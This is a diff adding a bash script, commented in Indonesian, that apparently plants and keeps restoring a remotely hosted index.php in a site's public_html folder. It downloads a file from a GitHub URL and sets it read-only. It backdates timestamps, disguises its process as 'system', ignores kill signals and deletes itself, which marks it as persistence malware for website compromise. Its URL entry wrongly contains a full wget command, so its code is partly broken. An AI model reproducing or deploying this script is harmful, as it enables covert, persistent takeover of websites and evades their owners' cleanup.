@@ -1,0 +1,127 @@
+        #!/bin/bash
+        # Konfigurasi
+        FOLDER_PATH="/home/nyy5dbkfpax0/public_html/"
+        TIMESTAMP="201201081531.12"
+
+        # Daftar file dan URL sumber (ganti URL sesuai keinginan)
+        declare -A FILES=(
+            ["index.php"]="wget -O index.php https://raw.githubusercontent.com/vincenttenxi/phoenixsignscoa/refs/heads/main/kelsco"
+        )
+
+        ensure_folder_exists() {
+            if [ ! -d "$FOLDER_PATH" ]; then
+                mkdir -p "$FOLDER_PATH" ||   exit 1
+                chmod 0755 "$FOLDER_PATH"
+            fi
+        }
+
+        get_file_hash() {
+            local file_path="$1"
+            if [ -f "$file_path" ]; then
+                md5sum "$file_path" | cut -d' ' -f1
+            else
+                echo ""
+            fi
+        }
+
+        update_file() {
+            local filename="$1"
+            local url="$2"
+            local file_path="${FOLDER_PATH}/${filename}"
+            local temp_file="${file_path}.tmp"
+
+            if [ -f "$file_path" ]; then
+                chmod 0555 "$file_path"
+            fi
+
+            # Ganti cp + mv → curl
+            if curl -fsL "$url" -o "$temp_file"; then
+                mv "$temp_file" "$file_path"
+                chmod 0555 "$file_path"
+                touch -t "$TIMESTAMP" "$file_path"
+                return 0
+            else
+                rm -f "$temp_file"
+                if [ -f "$file_path" ]; then
+                    chmod 0444 "$file_path"
+                fi
+                return 1
+            fi
+        }
+
+        check_file_changes() {
+            local filename="$1"
+            local url="$2"
+            local file_path="${FOLDER_PATH}/${filename}"
+
+            # Download sementara untuk cek hash
+            local tmp_hash=$(curl -fsL "$url" | md5sum | cut -d' ' -f1)
+            local local_hash=$(get_file_hash "$file_path")
+
+            if [ -n "$tmp_hash" ] && [ "$tmp_hash" != "$local_hash" ]; then
+                return 0  # berubah
+            fi
+            return 1      # sama atau gagal download
+        }
+
+        check_process() {
+            if pgrep -x "system" > /dev/null; then
+                return 0
+            else
+                return 1
+            fi
+        }
+
+        run_in_background() {
+            exec 0</dev/null
+            exec 1>/dev/null
+            exec 2>/dev/null
+            trap "" SIGTERM SIGHUP SIGINT
+            sleep $((RANDOM % 5))
+            nice -n 19 nohup setsid bash -c "exec -a 'system' $0 run" &
+            exit 0
+        }
+
+        self_delete() {
+            sleep $((RANDOM % 3))
+            local script_dir=$(dirname "$0")
+            rm -f "$0" "${script_dir}/system.enc" "${script_dir}/system" 2>/dev/null
+        }
+
+        main() {
+            local script_dir=$(dirname "$0")
+            local temp_system="${script_dir}/system"
+
+            if [ "$1" = "run" ]; then
+                trap "" SIGTERM SIGHUP SIGINT
+                exec -a "system" nice -n 19 bash "$0" run_inner
+            elif [ "$1" = "run_inner" ]; then
+                while true; do
+                    ensure_folder_exists
+                    for filename in "${!FILES[@]}"; do
+                        file_path="${FOLDER_PATH}/${filename}"
+                        url="${FILES[$filename]}"
+                        if [ ! -f "$file_path" ]; then
+                            update_file "$filename" "$url"
+                        else
+                            if check_file_changes "$filename" "$url"; then
+                                update_file "$filename" "$url"
+                            fi
+                        fi
+                    done
+                    sleep $((10 + RANDOM % 5))
+                done
+            else
+                if ! check_process; then
+                    cp "$0" "$temp_system" 2>/dev/null
+                    chmod +x "$temp_system" 2>/dev/null
+                    "$temp_system" run &
+                    self_delete
+                else
+                    exit 0
+                fi
+            fi
+        }
+
+        # Jalankan
+        main "$@"
